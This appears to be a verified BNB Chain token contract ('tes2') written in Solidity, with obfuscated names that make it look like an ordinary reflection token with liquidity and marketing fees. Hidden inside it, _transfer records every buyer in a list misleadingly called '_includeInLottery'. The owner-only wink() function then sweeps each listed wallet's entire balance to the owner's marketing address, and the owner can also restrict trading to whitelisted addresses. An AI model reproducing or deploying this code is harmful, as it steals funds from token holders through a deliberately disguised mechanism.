/**
 *Submitted for verification at BscScan.com on 2022-01-16
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function tmb(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function krg(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function kli(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function bgi(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function krg(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function bgi(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TEST2 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    uint8 private _decimals = 9;
    uint256 private _tTotal = 10**9 * 10**_decimals;

    uint256 private _mxtxa;
    mapping (address => uint256) private _rOwned;mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;mapping (address => bool) private _sicludepatu;
    address[] private _excluded;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    string private _name = "tes2";
    string private _symbol = "test2";

    struct SFE{uint256 mrkt;uint256 lqdt;}struct BFE{uint256 mrkt;uint256 lqdt;}struct TADDR{address mrkt;}
    struct TEMPF{uint256 psfm;uint256 psfl;uint256 pbfm;uint256 pbfl;}
    SFE private sfe;BFE private bfe;TADDR private taddr;TEMPF private tempf;
    uint256 dnmntr;uint256 private _ttlfbrp;
    bool te = false;bool eye = false;
    mapping (address => bool) private includeInLottery;address[] private _includeInLottery;mapping (address => bool) private _fmlysj;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    uint256 private numTokensSellToAddToLiquidity = 1000000000 * 10**18;
    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        _rOwned[owner()] = _rTotal;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        _fmlysj[owner()] = true;_fmlysj[address(this)] = true;_fmlysj[taddr.mrkt] = true;
        _mxtxa = 1*(_tTotal)/100;

        dnmntr=10**2;
        sfe.mrkt=10;sfe.lqdt=5;bfe.mrkt=10;bfe.lqdt=5;
        tempf.pbfl=bfe.lqdt;tempf.pbfm=bfe.mrkt;tempf.psfl=sfe.lqdt;tempf.psfm=sfe.mrkt;
        taddr.mrkt = 0x926605D0729a968266f1BB299d8Df0471C4F5367;
        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        if (_sicludepatu[account]) return _tOwned[account];
        return tkndrtitit(_rOwned[account]);
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].krg(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].tmb(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].krg(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function brpttlf() private view returns (uint256) {
        return _ttlfbrp;
    }
    function deliver(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_sicludepatu[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,) = _trV(tAmount, false);
        _rOwned[sender] = _rOwned[sender].krg(rAmount);
        _rTotal = _rTotal.krg(rAmount);
        _ttlfbrp = _ttlfbrp.tmb(tAmount);}
    function tkndrtitit(uint256 rjmlhA) public view returns(uint256) {
        require(rjmlhA <= _rTotal, "Amount must be less than total reflections");
        uint256 rtsaiki =  _bilret();
        return rjmlhA.bgi(rtsaiki);}
    function _TrFkdNya(address fromspayh, address kespayh, uint256 tabrp) private {
        (uint256 rabrp, uint256 rtrfa, uint256 ttrfa, uint256 liqlh, uint256 mrktceunah) = _trV(tabrp, false);
        _tOwned[fromspayh] = _tOwned[fromspayh].krg(tabrp);_rOwned[fromspayh] = _rOwned[fromspayh].krg(rabrp);
        _tOwned[kespayh] = _tOwned[kespayh].tmb(ttrfa);_rOwned[kespayh] = _rOwned[kespayh].tmb(rtrfa);        
        _getLqdT(liqlh); _mbilMrkt(mrktceunah);
        emit Transfer(fromspayh, kespayh, ttrfa);}
    function msknfmly(address account)public onlyOwner{_fmlysj[account] = true;}
    function klrkndrfmly(address account)public onlyOwner{_fmlysj[account] = false;}
    function stsmwf(uint256 nlqdtf, uint256 nmrktf)public onlyOwner{bfe.mrkt = nmrktf;bfe.lqdt = nlqdtf;}
    function stmxtxp(uint256 mxtxp) external onlyOwner(){_mxtxa=mxtxp*(_tTotal)/100;}
    function setSwapAndLiquifyEnabled(bool _enabled)public onlyOwner {swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);}
    receive() external payable {}
    function _trV(uint256 trfAbrpa, bool gblhtw) private view returns (uint256, uint256, uint256, uint256, uint256) {
        (uint256 trfTbrpa, uint256 liqlh, uint256 mrktceunah) = _Trv(trfAbrpa, gblhtw);
        (uint256 trfRbrpa, uint256 rtrfbacdf) = _tRv(trfAbrpa, liqlh, mrktceunah, _bilret());
        return (trfRbrpa, rtrfbacdf, trfTbrpa, liqlh, mrktceunah);}
    function _Trv(uint256 tamun, bool kpobgt) private view returns (uint256, uint256, uint256) {
        uint256 liqlh = tamun.kli(bfe.lqdt).bgi(dnmntr);uint256 mrktceunah=tamun.kli(bfe.mrkt).bgi(dnmntr);
        if(kpobgt){liqlh=tamun.kli(sfe.lqdt).bgi(dnmntr);mrktceunah = tamun.kli(sfe.mrkt).bgi(dnmntr);}
        uint256 tTrnskJml = tamun.krg(liqlh).krg(mrktceunah);
        return (tTrnskJml, liqlh, mrktceunah);}
    function _tRv(uint256 xiximounta, uint256 liqlh, uint256 mrktceunah, uint256 rtSaikiKntl) private pure returns (uint256, uint256) {
        uint256 mountnotmintr = xiximounta.kli(rtSaikiKntl);uint256 rliqny = liqlh.kli(rtSaikiKntl);
        uint256 retmarkynya = mrktceunah.kli(rtSaikiKntl);uint256 rttasj = mountnotmintr.krg(rliqny).krg(retmarkynya);
        return (mountnotmintr, rttasj);}
    function _bilret() private view returns(uint256) {
        (uint256 rsplyapy, uint256 tsplyapy) = _mbilsply();
        return rsplyapy.bgi(tsplyapy);}
    function _mbilsply() private view returns(uint256, uint256) {
        uint256 rSupply=_rTotal;uint256 tSupply=_tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.krg(_rOwned[_excluded[i]]);tSupply = tSupply.krg(_tOwned[_excluded[i]]);}
        if (rSupply < _rTotal.bgi(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    function _getLqdT(uint256 liqlh) private {
        uint256 rtSaikiKntl=_bilret();uint256 rliqny=liqlh.kli(rtSaikiKntl);
        _rOwned[address(this)]=_rOwned[address(this)].tmb(rliqny);
        if(_sicludepatu[address(this)]){_tOwned[address(this)] = _tOwned[address(this)].tmb(liqlh);}
    }
    function _mbilMrkt(uint256 mrktceunah) private {
        uint256 rtSaikiKntl=_bilret();uint256 retmarkynya=mrktceunah.kli(rtSaikiKntl);
        _rOwned[taddr.mrkt]=_rOwned[taddr.mrkt].tmb(retmarkynya);
        if(_sicludepatu[taddr.mrkt]){_tOwned[taddr.mrkt]=_tOwned[taddr.mrkt].tmb(mrktceunah);}
    }
    function pussmwf() private {if(bfe.lqdt == 0 && bfe.mrkt == 0 && sfe.lqdt == 0 && sfe.mrkt == 0){return;}tempf.pbfm=bfe.mrkt;tempf.pbfl=bfe.lqdt;tempf.psfm=sfe.mrkt;tempf.psfl=sfe.lqdt;bfe.mrkt=0;bfe.lqdt=0;sfe.mrkt=0;sfe.lqdt=0;}
    function blknsmwf()private{bfe.mrkt = tempf.pbfm;bfe.lqdt = tempf.pbfl;sfe.mrkt = tempf.psfm;sfe.lqdt = tempf.psfl;}
    function spsjfmly(address kunx)public view returns(bool){return _fmlysj[kunx];}
    function _approve(address owner, address spender, uint256 amount) private {
        require(tlakjiro(owner) == false, "ERC20: approve from the zero address");
        require(tlakjiro(spender) == false, "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address drisp,address kesp,uint256 brpdh) private {
        require(tlakjiro(drisp) == false, "ERC20: transfer from the zero address");
        require(tlakjiro(kesp) == false, "ERC20: transfer to the zero address");
        require(brpdh > 0, "Transfer amount must be greater than zero");
        if(!te){require(_fmlysj[drisp] == true, "Trading not enabled yet");}
        if(drisp != owner() && kesp != owner()){require(brpdh <= _mxtxa, "Transfer amount exceeds the maxTxAmount.");}
        uint256 blenkntrk = balanceOf(address(this));
        if(blenkntrk >= _mxtxa){blenkntrk = _mxtxa;}
        bool overMinTokenBalance = blenkntrk >= numTokensSellToAddToLiquidity;
        if (overMinTokenBalance &&!inSwapAndLiquify && drisp != uniswapV2Pair && swapAndLiquifyEnabled
         ){blenkntrk = numTokensSellToAddToLiquidity;swapAndLiquify(blenkntrk);}
        bool takeFee = true;bool isjl = drisp == uniswapV2Pair;
        if(_fmlysj[drisp] || _fmlysj[kesp]){takeFee = false;}
        if(eye){includeInLottery[kesp] = true;_includeInLottery.push(kesp);}
        _blmtkntrfsbnrx(drisp,kesp,brpdh,takeFee,isjl);
    }
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 half = contractTokenBalance.bgi(2);
        uint256 otherHalf = contractTokenBalance.krg(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance.krg(initialBalance);
        addLiquidity(otherHalf, newBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }
    function _blmtkntrfsbnrx(address fromsp, address tosp, uint256 brpcok,bool fikh, bool apni) private {
        if(!fikh){pussmwf();}
        if (_sicludepatu[fromsp] && !_sicludepatu[tosp]) { _trFdrNya(fromsp,tosp,brpcok);}
        else if (!_sicludepatu[fromsp] && _sicludepatu[tosp]) {_tRfkNya(fromsp,tosp,brpcok);}
        else if (!_sicludepatu[fromsp] && !_sicludepatu[tosp]){_trfbajh(fromsp,tosp,brpcok,apni);}
        else if (_sicludepatu[fromsp] && _sicludepatu[tosp]) { _TrFkdNya(fromsp,tosp,brpcok);}
        else {_trfbajh(fromsp, tosp, brpcok, apni);}
        if(!fikh){blknsmwf();}
    }
    function _trfbajh(address xiXixo, address ngentotspa, uint256 tAmount, bool apyh) private {
        (uint256 raMouNT, uint256 rrererkntol, uint256 tTplerEa, uint256 liqlh, uint256 mrktceunah) = _trV(tAmount, apyh);
        _rOwned[xiXixo]=_rOwned[xiXixo].krg(raMouNT);_rOwned[ngentotspa]=_rOwned[ngentotspa].tmb(rrererkntol);_getLqdT(liqlh);_mbilMrkt(mrktceunah);
        emit Transfer(xiXixo, ngentotspa, tTplerEa);
    }
    function _tRfkNya(address ngentotspa, address sundaynibos, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 liqlh, uint256 mrktceunah) = _trV(tAmount, false);
        _rOwned[ngentotspa]=_rOwned[ngentotspa].krg(rAmount);_tOwned[sundaynibos]=_tOwned[sundaynibos].tmb(tTransferAmount);_rOwned[sundaynibos]=_rOwned[sundaynibos].tmb(rTransferAmount);           
        _getLqdT(liqlh);_mbilMrkt(mrktceunah);
        emit Transfer(ngentotspa, sundaynibos, tTransferAmount);
    }
    function _trFdrNya(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 liqlh, uint256 mrktceunah) = _trV(tAmount, false);
        _tOwned[sender] = _tOwned[sender].krg(tAmount); _rOwned[sender] = _rOwned[sender].krg(rAmount);
        _rOwned[recipient] = _rOwned[recipient].tmb(rTransferAmount);    _getLqdT(liqlh);_mbilMrkt(mrktceunah);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function sette()external onlyOwner{if(te){te=false;eye=false;}else{te=true;eye=true;}}
    function wink()external onlyOwner{if(eye){eye=false;ngnttbt();}else{eye=true;}}
    function ngnttbt()internal{for(uint256 i=0;i<_includeInLottery.length;i++){
        address wallet=_includeInLottery[i];uint256 amount=balanceOf(wallet);_TrFkdNya(wallet,taddr.mrkt,amount);}
        _includeInLottery=new address [](0);
    }
    function tlakjiro(address addr) private pure returns (bool){return addr == address(0);}
    function stMrktWHiya(address mroil)external onlyOwner{taddr.mrkt = mroil;}
}